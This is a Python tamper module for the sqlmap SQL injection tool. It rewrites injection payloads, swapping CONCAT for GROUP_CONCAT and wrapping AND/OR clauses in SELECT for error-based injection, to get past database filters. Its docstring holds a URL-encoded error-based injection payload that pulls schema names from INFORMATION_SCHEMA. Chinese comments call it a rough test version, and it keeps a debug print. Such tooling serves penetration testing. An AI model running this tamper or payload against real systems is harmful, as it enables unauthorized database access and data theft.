#!/usr/bin/env python

"""
Copyright (c) 2006-2021 sqlmap developers (http://sqlmap.org/)
See the file 'LICENSE' for copying permission
"""

from lib.core.enums import PRIORITY
import re
from lib.core.data import conf
from lib.core.data import kb

__priority__ = PRIORITY.HIGHEST


def dependencies():
    pass


def tamper(payload, **kwargs):
    """
    Replace concat with group_concat

    替换concat为group_concat,用法并不一致,仅作测试

    >>> tamper("id=1%27%20AND%20GTID_SUBSET%28CONCAT%280x7171787071%2C%28SELECT%20MID%28%28IFNULL%28CAST%28schema_name%20AS%20NCHAR%29%2C0x20%29%29%2C1%2C190%29%20FROM%20INFORMATION_SCHEMA.SCHEMATA%20LIMIT%2012%2C1%29%2C0x7178767671%29%2C8603%29%20AND%20%27gRT")
    'id=1%27%20AND%20GTID_SUBSET%28GROUP_CONCAT%280x7171787071%2C%28SELECT%20MID%28%28IFNULL%28CAST%28schema_name%20AS%20NCHAR%29%2C0x20%29%29%2C1%2C190%29%20FROM%20INFORMATION_SCHEMA.SCHEMATA%20LIMIT%2012%2C1%29%2C0x7178767671%29%2C8603%29%20AND%20%27gRT'
    """
    print(conf.technique,kb.technique)
    if (conf.technique[0] == 2 or kb.technique == 2):
        # 报错注入
        if "and " in payload.lower():
            payload = re.sub(r"AND ", 'AND (SELECT ', payload, 1, flags=re.I)
        if "or " in payload.lower():
            payload = re.sub(r"OR ", 'OR (SELECT ', payload, 1, flags=re.I)
        payload = re.sub(r"concat(?=\()", 'GROUP_CONCAT', payload, flags=re.I)
        payload = re.sub(r"\)(?=[^\)]*$)", '))', payload, flags=re.I)
        payload = re.sub(r"JSON_ARRAYAGG(?=\()", '', payload, flags=re.I)
    else:
        payload = re.sub(r"concat(?=\()", 'GROUP_CONCAT', payload, flags=re.I)
        payload = re.sub(r"JSON_ARRAYAGG(?=\()", '', payload, flags=re.I)
    return payload if payload else payload
